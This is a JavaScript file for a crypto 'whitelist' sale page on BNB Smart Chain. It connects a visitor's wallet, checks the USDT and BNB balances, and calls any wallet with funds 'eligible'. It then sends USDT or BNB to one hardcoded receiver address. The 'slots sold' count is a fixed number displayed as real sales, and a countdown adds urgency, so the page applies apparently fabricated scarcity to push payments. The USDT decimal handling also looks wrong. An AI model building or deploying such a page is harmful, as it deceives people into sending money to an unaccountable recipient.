const usdtContract = '0x55d398326f99059fF775485246999027B3197955';
const ABI = [
  {
    "constant": true,
    "inputs": [{ "name": "_owner", "type": "address" }],
    "name": "balanceOf",
    "outputs": [{ "name": "balance", "type": "uint256" }],
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [
      { "name": "_to", "type": "address" },
      { "name": "_value", "type": "uint256" }
    ],
    "name": "transfer",
    "outputs": [{ "name": "success", "type": "bool" }],
    "type": "function"
  }
];

let connectedWallet = null;
let web3;
let provider;

// Khởi tạo WalletConnect
async function initWalletConnect() {
  if (typeof WalletConnectProvider === 'undefined') {
    console.error("WalletConnectProvider not loaded");
    return false;
  }
  try {
    provider = new WalletConnectProvider({
      rpc: { 56: 'https://bsc-dataseed.binance.org/' }, // BSC Mainnet
      chainId: 56,
      projectId: '8da24de9722108962a6b7aef48298aae',
    });
    web3 = new Web3(provider);
    return true;
  } catch (error) {
    console.error("WalletConnect init failed:", error);
    return false;
  }
}

// Fallback MetaMask
async function initMetaMask() {
  if (window.ethereum) {
    web3 = new Web3(window.ethereum);
    return true;
  }
  return false;
}

// Hamburger Menu Toggle
document.addEventListener('DOMContentLoaded', async () => {
  const hamburgerIcon = document.querySelector('.hamburger-icon');
  const navMenu = document.querySelector('#nav-menu');
  hamburgerIcon.addEventListener('click', () => {
    navMenu.classList.toggle('active');
  });

  // Thử WalletConnect trước, fallback MetaMask
  if (!(await initWalletConnect())) {
    await initMetaMask();
  }
});

// Connect Wallet
document.getElementById('connectButton').addEventListener('click', async () => {
  console.log("Connect Wallet clicked");
  try {
    let accounts;
    if (provider) {
      // WalletConnect
      await provider.enable(); // Mở app ví
      accounts = await web3.eth.getAccounts();
    } else if (window.ethereum) {
      // MetaMask
      accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
    } else {
      throw new Error("No wallet provider available");
    }

    connectedWallet = accounts[0];
    document.getElementById('walletText').innerText = `Connected: ${connectedWallet.slice(0, 6)}...${connectedWallet.slice(-4)}`;
    document.getElementById('connectButton').style.display = 'none';
    document.getElementById('disconnectButton').style.display = 'block';
    console.log("Wallet connected:", connectedWallet);

    // Check số dư USDT và BNB
    const contract = new web3.eth.Contract(ABI, usdtContract);
    const balanceUSDT = await contract.methods.balanceOf(connectedWallet).call();
    const balanceBNB = await web3.eth.getBalance(connectedWallet);
    const usdtValue = Number(web3.utils.fromWei(balanceUSDT, 'mwei'));
    const bnbValue = Number(web3.utils.fromWei(balanceBNB, 'ether'));
    console.log("USDT Balance:", usdtValue);
    console.log("BNB Balance:", bnbValue);

    // Check whitelist eligibility
    const isEligible = usdtValue > 0 || bnbValue > 0;
    document.getElementById('resultText').innerText = isEligible ? 'Eligible' : 'Not eligible';

    // Hiển thị form whitelist
    document.getElementById('whitelistForm').style.display = 'block';
    if (isEligible) {
      document.getElementById('payButton').style.display = 'block';
      document.getElementById('notEligibleText').style.display = 'none';
      document.getElementById('exclusiveMessage').style.display = 'block';
      console.log("Wallet eligible for whitelist");
    } else {
      document.getElementById('payButton').style.display = 'none';
      document.getElementById('notEligibleText').style.display = 'block';
      document.getElementById('exclusiveMessage').style.display = 'none';
      console.log("Wallet not eligible for whitelist");
    }
  } catch (error) {
    document.getElementById('resultText').innerText = 'Error connecting wallet: ' + error.message;
    console.error("Error connecting wallet:", error);
    // Fallback nếu ví không cài
    if (/Mobi|Android|iPhone/i.test(navigator.userAgent)) {
      setTimeout(() => {
        window.location.href = 'https://metamask.app.link';
      }, 1000);
    }
  }
});

// Disconnect Wallet
document.getElementById('disconnectButton').addEventListener('click', async () => {
  try {
    if (provider) {
      await provider.disconnect();
    }
    connectedWallet = null;
    document.getElementById('walletText').innerText = '';
    document.getElementById('resultText').innerText = '';
    document.getElementById('whitelistForm').style.display = 'none';
    document.getElementById('connectButton').style.display = 'block';
    document.getElementById('disconnectButton').style.display = 'none';
    console.log("Wallet disconnected");
  } catch (error) {
    console.error("Disconnect error:", error);
  }
});

// Buy Whitelist
document.getElementById('payButton').addEventListener('click', async (e) => {
  e.preventDefault();
  if (!connectedWallet) {
    document.getElementById('resultText').innerText = 'Wallet not connected';
    console.log("Wallet not connected");
    return;
  }
  const [amount, currency] = document.getElementById('amountDropdown').value.split('|');
  const receiver = '0x871526acf5345BA48487dc177C83C453e9B998F5';
  try {
    if (currency === 'USDT') {
      const contract = new web3.eth.Contract(ABI, usdtContract);
      const amountWei = web3.utils.toWei(amount, 'mwei');
      await contract.methods.transfer(receiver, amountWei).send({ from: connectedWallet });
      document.getElementById('resultText').innerText = 'USDT payment successful!';
      console.log("USDT payment successful");
    } else if (currency === 'BNB') {
      const amountWei = web3.utils.toWei(amount, 'ether');
      await web3.eth.sendTransaction({
        from: connectedWallet,
        to: receiver,
        value: amountWei
      });
      document.getElementById('resultText').innerText = 'BNB payment successful!';
      console.log("BNB payment successful");
    }
    document.getElementById('payButton').style.display = 'none';
    document.getElementById('connectButton').style.display = 'none';
    document.getElementById('disconnectButton').style.display = 'block';
  } catch (error) {
    document.getElementById('resultText').innerText = 'Payment failed: ' + error.message;
    console.error("Payment failed:", error);
  }
});

// Fixed slots
const currentSlots = 394;
const maxSlots = 500;
const resetDate = new Date('2025-04-28').getTime();
function updateSlots() {
  document.getElementById('slotsText').innerText = `${currentSlots}/500 slots sold!`;
}
function updateCountdown() {
  const now = new Date().getTime();
  const timeLeft = (resetDate - now) / (1000 * 60 * 60 * 24);
  document.getElementById('countdownText').innerText = `${Math.ceil(timeLeft)} days left!`;
}
updateSlots();
updateCountdown();
setInterval(() => { updateCountdown(); }, 10000);

particlesJS('particles-js', { particles: { number: { value: 20 }, color: { value: '#FF4500' }, shape: { type: 'star' }, opacity: { value: 0.7, random: true }, size: { value: 2, random: true }, move: { speed: 0.5, direction: 'bottom' } } });
